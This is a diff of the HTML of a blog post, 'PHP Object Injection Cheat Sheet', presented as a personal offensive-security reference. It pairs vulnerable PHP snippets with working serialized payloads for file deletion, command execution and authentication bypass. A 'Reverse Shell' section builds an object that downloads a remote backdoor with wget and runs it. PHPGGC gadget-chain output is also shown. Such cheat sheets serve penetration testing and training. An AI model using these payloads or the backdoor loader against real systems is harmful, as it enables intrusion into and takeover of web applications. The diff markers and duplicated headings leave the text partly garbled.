id="exploit-with-the-__destruct-method"><span class="me-2">Exploit with the __destruct method</span><a href="#exploit-with-the-__destruct-method" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Vulnerable code:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="known-vulnerable-software"><span class="me-2">Known Vulnerable Software</span><a href="#known-vulnerable-software" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<div class="table-wrapper"><table>
+  <thead>
+    <tr>
+      <th>Software</th>
+      <th>Version</th>
+      <th>Reference</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>WordPress</td>
+      <td>3.6.1</td>
+      <td>https://nvd.nist.gov/vuln/detail/CVE-2013-4338</td>
+    </tr>
+    <tr>
+      <td>Magento</td>
+      <td>1.9.0.1</td>
+      <td>https://magento.com/security/patches/supee-10415</td>
+    </tr>
+    <tr>
+      <td>Joomla</td>
+      <td>3.0.3</td>
+      <td>https://packetstormsecurity.com/files/121442/Joomla-3.0.3-PHP-Object-Injection.html</td>
+    </tr>
+    <tr>
+      <td>IP Board</td>
+      <td>3.3.4</td>
+      <td>https://www.exploit-db.com/exploits/22398/</td>
+    </tr>
+    <tr>
+      <td>Dotclear</td>
+      <td>2.6.1</td>
+      <td>https://www.cvedetails.com/cve/CVE-2014-1613/</td>
+    </tr>
+    <tr>
+      <td>OpenCart</td>
+      <td>1.5.6.4</td>
+      <td>http://karmainsecurity.com/KIS-2014-08</td>
+    </tr>
+    <tr>
+      <td>CubeCart</td>
+      <td>5.2.0</td>
+      <td>http://karmainsecurity.com/KIS-2013-02</td>
+    </tr>
+    <tr>
+      <td>Drupal</td>
+      <td>7.34</td>
+      <td>https://websec.wordpress.com/2015/01/09/drupal-7-34-admin-php-object-injection/</td>
+    </tr>
+    <tr>
+      <td>vBulletin</td>
+      <td>5.1.0</td>
+      <td>https://blog.sucuri.net/2014/03/security-exploit-patched-on-vbulletin-php-object-injection.html</td>
+    </tr>
+    <tr>
+      <td>Tuelap</td>
+      <td>7.6-4</td>
+      <td>http://karmainsecurity.com/KIS-2014-13</td>
+    </tr>
+    <tr>
+      <td>Moodle</td>
+      <td>2.5.0</td>
+      <td>http://disse.cting.org/2013/09/16/2013-09-16-moodle-2-5-0-1-badges-external-object-injection</td>
+    </tr>
+    <tr>
+      <td>WHMCS</td>
+      <td>5.2.12</td>
+      <td>http://security-geeks.blogspot.com/2013/11/whmcs-5112-php-object-injectoin.html</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h2 id="php-magic-methods"><span class="me-2">PHP Magic Methods</span><a href="#php-magic-methods" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<div class="table-wrapper"><table>
+  <tbody>
+    <tr>
+      <td>__construct()</td>
+      <td>__set()</td>
+      <td>__toString()</td>
+    </tr>
+    <tr>
+      <td>__destruct()</td>
+      <td>__isset()</td>
+      <td>__invoke()</td>
+    </tr>
+    <tr>
+      <td>__call()</td>
+      <td>__unset()</td>
+      <td>__set_state()</td>
+    </tr>
+    <tr>
+      <td>__callStatic()</td>
+      <td>__sleep()</td>
+      <td>__clone()</td>
+    </tr>
+    <tr>
+      <td>__get()</td>
+      <td>__wakeup()</td>
+      <td>__debugInfo()</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h2 id="examples-of-php-object-injection"><span class="me-2">Examples of PHP Object Injection</span><a href="#examples-of-php-object-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="exploit-with-the-__destruct-method"><span class="me-2">Exploit with the __destruct method</span><a href="#exploit-with-the-__destruct-method" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Vulnerable code:</p>
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -29,7 +1049,7 @@
 19
 20
 21
-</pre><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">Example1</span>
+</pre></td><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">Example1</span>
 <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$cache_file</span><span class="p">;</span>
 
@@ -50,9 +1070,22 @@
 <span class="nv">$user_data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]);</span>
 
 <span class="c1">// some PHP code..</span>
-</pre></table></code></div></div><p>Payload:</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre><td class="rouge-code"><pre><span class="err">http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}
-</span></pre></table></code></div></div><h3 id="exploit-with-the-__wakeup-in-the-unserialize-function"><span class="me-2">Exploit with the __wakeup in the unserialize function</span><a href="#exploit-with-the-__wakeup-in-the-unserialize-function" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Vulnerable code:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Payload:</p>
+<div class="language-http highlighter-rouge"><div class="code-header">
+        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="err">http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}
+</span></pre></td></tr></tbody></table></code></div></div>
+
+<h3 id="exploit-with-the-__wakeup-in-the-unserialize-function"><span class="me-2">Exploit with the __wakeup in the unserialize function</span><a href="#exploit-with-the-__wakeup-in-the-unserialize-function" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Vulnerable code:</p>
+
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -73,7 +1106,7 @@
 19
 20
 21
-</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> 
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> 
     <span class="kd">class</span> <span class="nc">PHPObjectInjection</span><span class="p">{</span>
         <span class="k">public</span> <span class="nv">$inject</span><span class="p">;</span>
         <span class="k">function</span> <span class="n">__construct</span><span class="p">(){</span>
@@ -94,33 +1127,60 @@
         <span class="k">echo</span> <span class="s2">""</span><span class="p">;</span> <span class="c1"># nothing happens here</span>
     <span class="p">}</span>
 <span class="cp">?&gt;</span>
-</pre></table></code></div></div><p>Payload:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Payload:</p>
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
 5
-</pre><td class="rouge-code"><pre><span class="c1"># Basic serialized data</span>
+</pre></td><td class="rouge-code"><pre><span class="c1"># Basic serialized data</span>
 <span class="n">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"XVWA"</span><span class="p">;</span><span class="n">i</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="s2">"Xtreme Vulnerable Web Application"</span><span class="p">;}</span>
 
 <span class="c1"># Command execution</span>
 <span class="nf">string</span><span class="p">(</span><span class="mi">68</span><span class="p">)</span> <span class="s2">"O:18:"</span><span class="nc">PHPObjectInjection</span><span class="s2">":1:</span><span class="si">{</span><span class="nv">s:6:"inject";s:17:"system('whoami');";</span><span class="si">}</span><span class="s2">"</span>
-</pre></table></code></div></div><h3 id="authentication-bypass---type-juggling"><span class="me-2">Authentication bypass - Type juggling</span><a href="#authentication-bypass---type-juggling" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Vulnerable code:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td></tr></tbody></table></code></div></div>
+
+<h3 id="authentication-bypass---type-juggling"><span class="me-2">Authentication bypass - Type juggling</span><a href="#authentication-bypass---type-juggling" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Vulnerable code:</p>
+
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
 5
 6
 7
-</pre><td class="rouge-code"><pre><span class="nv">$data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'auth'</span><span class="p">]);</span>
+</pre></td><td class="rouge-code"><pre><span class="nv">$data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'auth'</span><span class="p">]);</span>
 
 <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$adminName</span> <span class="o">&amp;&amp;</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$adminPassword</span><span class="p">)</span> <span class="p">{</span>
     <span class="nv">$admin</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
     <span class="nv">$admin</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></table></code></div></div><p>Payload:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre><td class="rouge-code"><pre><span class="n">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"username"</span><span class="p">;</span><span class="n">b</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"password"</span><span class="p">;</span><span class="n">b</span><span class="o">:</span><span class="mi">1</span><span class="p">;}</span>
-</pre></table></code></div></div><h3 id="authentication-bypass---object-reference"><span class="me-2">Authentication bypass - Object reference</span><a href="#authentication-bypass---object-reference" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Vulnerable code:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Payload:</p>
+
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"username"</span><span class="p">;</span><span class="n">b</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"password"</span><span class="p">;</span><span class="n">b</span><span class="o">:</span><span class="mi">1</span><span class="p">;}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<h3 id="authentication-bypass---object-reference"><span class="me-2">Authentication bypass - Object reference</span><a href="#authentication-bypass---object-reference" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Vulnerable code:</p>
+
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -136,7 +1196,7 @@
 14
 15
 16
-</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
 <span class="kd">class</span> <span class="nc">Object</span>
 <span class="p">{</span>
   <span class="k">var</span> <span class="nv">$guess</span><span class="p">;</span>
@@ -152,9 +1212,22 @@
     <span class="p">}</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
-</pre></table></code></div></div><p>Payload:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre><td class="rouge-code"><pre><span class="nc">O</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">"Object"</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">"secretCode"</span><span class="p">;</span><span class="nc">N</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"code"</span><span class="p">;</span><span class="nc">R</span><span class="o">:</span><span class="mi">2</span><span class="p">;}</span>
-</pre></table></code></div></div><h3 id="authentication-bypass---object-reference-1"><span class="me-2">Authentication bypass - Object reference</span><a href="#authentication-bypass---object-reference-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Vulnerable code:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Payload:</p>
+
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nc">O</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">"Object"</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">"secretCode"</span><span class="p">;</span><span class="nc">N</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"code"</span><span class="p">;</span><span class="nc">R</span><span class="o">:</span><span class="mi">2</span><span class="p">;}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<h3 id="authentication-bypass---object-reference-1"><span class="me-2">Authentication bypass - Object reference</span><a href="#authentication-bypass---object-reference-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Vulnerable code:</p>
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -174,7 +1247,7 @@
 18
 19
 20
-</pre><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">Example3</span>
+</pre></td><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">Example3</span>
 <span class="p">{</span>
    <span class="k">protected</span> <span class="nv">$obj</span><span class="p">;</span>
 
@@ -194,7 +1267,11 @@
 <span class="nv">$user_data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]);</span>
 
 <span class="c1">// some PHP code..</span>
-</pre></table></code></div></div><p>Payload:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td></tr></tbody></table></code></div></div>
+<p>Payload:</p>
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -210,7 +1287,7 @@
 14
 15
 16
-</pre><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">SQL_Row_Value</span>
+</pre></td><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">SQL_Row_Value</span>
 <span class="p">{</span>
    <span class="k">private</span> <span class="nv">$_table</span> <span class="o">=</span> <span class="s2">"SQL Injection"</span><span class="p">;</span>
 <span class="p">}</span>
@@ -226,21 +1303,39 @@
 <span class="p">}</span>
 
 <span class="k">print</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">Example3</span><span class="p">));</span>
-</pre></table></code></div></div><h2 id="others-exploits"><span class="me-2">Others exploits</span><a href="#others-exploits" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h4 id="reverse-shell"><span class="me-2">Reverse Shell</span><a href="#reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="others-exploits"><span class="me-2">Others exploits</span><a href="#others-exploits" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h4 id="reverse-shell"><span class="me-2">Reverse Shell</span><a href="#reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
 5
 6
 7
-</pre><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">PHPObjectInjection</span>
+</pre></td><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">PHPObjectInjection</span>
 <span class="p">{</span>
     <span class="c1">// CHANGE URL/FILENAME TO MATCH YOUR SETUP</span>
     <span class="k">public</span> <span class="nv">$inject</span> <span class="o">=</span> <span class="s2">"system('wget http://URL/backdoor.txt -O phpobjbackdoor.php &amp;&amp; php phpobjbackdoor.php');"</span><span class="p">;</span>
 <span class="p">}</span>
 
 <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">PHPObjectInjection</span><span class="p">));</span>
-</pre></table></code></div></div><h2 id="finding-and-using-gadgets-phpggc"><span class="me-2">Finding and using gadgets (PHPGGC)</span><a href="#finding-and-using-gadgets-phpggc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically. When encountering an unserialize on a website you don’t have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them.</p><p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="finding-and-using-gadgets-phpggc"><span class="me-2">Finding and using gadgets (PHPGGC)</span><a href="#finding-and-using-gadgets-phpggc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically. When encountering an unserialize on a website you don’t have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them.</p>
+
+<p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -267,7 +1362,7 @@
 25
 26
 27
-</pre><td class="rouge-code"><pre><span class="nv">$ </span>./phpggc <span class="nt">-l</span>
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>./phpggc <span class="nt">-l</span>
 
 Gadget Chains
 <span class="nt">-------------</span>
@@ -294,8 +1389,5239 @@ Symfony/RCE2          2.3.42 &lt; 2.6      rce              __destruct     <span
 Symfony/RCE3          2.6 &lt;<span class="o">=</span> 2.8.32     rce              __destruct     <span class="k">*</span>    
 Yii/RCE1              1.1.19            rce              __destruct          
 ZendFramework/RCE1    ? &lt;<span class="o">=</span> 1.12.20      rce              __destruct     <span class="k">*</span> 
-</pre></table></code></div></div><p>Example:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Example:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
-</pre><td class="rouge-code"><pre><span class="nv">$ </span>./phpggc monolog/rce1 <span class="s1">'phpinfo();'</span>
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>./phpggc monolog/rce1 <span class="s1">'phpinfo();'</span>
 O:32:<span class="s2">"Monolog</span><span class="se">\H</span><span class="s2">andler</span><span class="se">\S</span><span class="s2">yslogUdpHandler"</span>:1:<span class="o">{</span>s:9:<span class="s2">"*socket"</span><span class="p">;</span>O:29:<span class="s2">"Monolog</span><span class="se">\H</span><span class="s2">andler</span><span class="se">\B</span><span class="s2">ufferHandler"</span>:7:<span class="o">{</span>s:10:<span class="s2">"*handler"</span><span class="p">;</span>r:2<span class="p">;</span>s:13:<span class="s2">"*bufferSize"</span><span class="p">;</span>i:-1<span class="p">;</span>s:9:<span class="s2">"*buffer"</span><span class="p">;</span>a:1:<span class="o">{</span>i:0<span class="p">;</span>a:2:<span class="o">{</span>i:0<span class="p">;</span>s:10:<span class="s2">"phpinfo();"</span><span class="p">;</span>s:5:<span class="s2">"level"</span><span class="p">;</span>N<span class="p">;</span><span class="o">}}</span>s:8:<span class="s2">"*level"</span><span class="p">;</span>N<span class="p">;</span>s:14:<span class="s2">"*initialized"</span><span class="p">;</span>b:1<span class="p">;</span>s:14:<span class="s2">"*bufferLimit"</span><span class="p">;</span>i:-1<span class="p">;</span>s:13:<span class="s2">"*processors"</span><span class="p">;</span>a:2:<span class="o">{</span>i:0<span class="p">;</span>s:7:<span class="s2">"current"</span><span class="p">;</span>i:1<span class="p">;</span>s:6:<span class="s2">"assert"</span><span class="p">;</span><span class="o">}}}</span>
-</pre></table></code></div></div><h2 id="thanks-to"><span class="me-2">Thanks to</span><a href="#thanks-to" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This article is composed of information found on the folowing links (+ plus some minor additions). I use this article to quick observe or demonstrate situations and as a personal reference to all the infromation needed in exploiting the PHP Object Injection Vulnerability.</p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PHP%20serialization">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PHP%20serialization</a></p><p><a href="https://securitycafe.ro/2015/01/05/understanding-php-object-injection/">https://securitycafe.ro/2015/01/05/understanding-php-object-injection/</a></p><p><a href="https://www.owasp.org/index.php/PHP_Object_Injection">https://www.owasp.org/index.php/PHP_Object_Injection</a></p><p><a href="http://location-href.com/php-object-injection/">http://location-href.com/php-object-injection/</a></p><p><a href="https://www.ambionics.io/blog/php-generic-gadget-chains">https://www.ambionics.io/blog/php-generic-gadget-chains</a></p><p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="nitesculucian.github.io/categories/cheatsheet/">cheatsheet</a>, <a href="nitesculucian.github.io/categories/offensive-security/">offensive_security</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="nitesculucian.github.io/tags/offensive-security/" class="post-tag no-text-decoration" >offensive security</a> <a href="nitesculucian.github.io/tags/cheat-sheet/" class="post-tag no-text-decoration" >cheat sheet</a> <a href="nitesculucian.github.io/tags/reverse/" class="post-tag no-text-decoration" >reverse</a> <a href="nitesculucian.github.io/tags/shell/" class="post-tag no-text-decoration" >shell</a> <a href="nitesculucian.github.io/tags/backdoor/" class="post-tag no-text-decoration" >backdoor</a> <a href="nitesculucian.github.io/tags/bash/" class="post-tag no-text-decoration" >bash</a> <a href="nitesculucian.github.io/tags/perl/" class="post-tag no-text-decoration" >perl</a> <a href="nitesculucian.github.io/tags/python/" class="post-tag no-text-decoration" >python</a> <a href="nitesculucian.github.io/tags/php/" class="post-tag no-text-decoration" >PHP</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=PHP%20Object%20Injection%20Cheat%20Sheet%20-%20Lucian%20Nitescu&url=https%3A%2F%2Fnitesculucian.github.io%2Fnitesculucian.github.io%2F2018%2F10%2F06%2Fphp-object-injection-cheat-sheet%2F" target="_blank" rel="noopener" 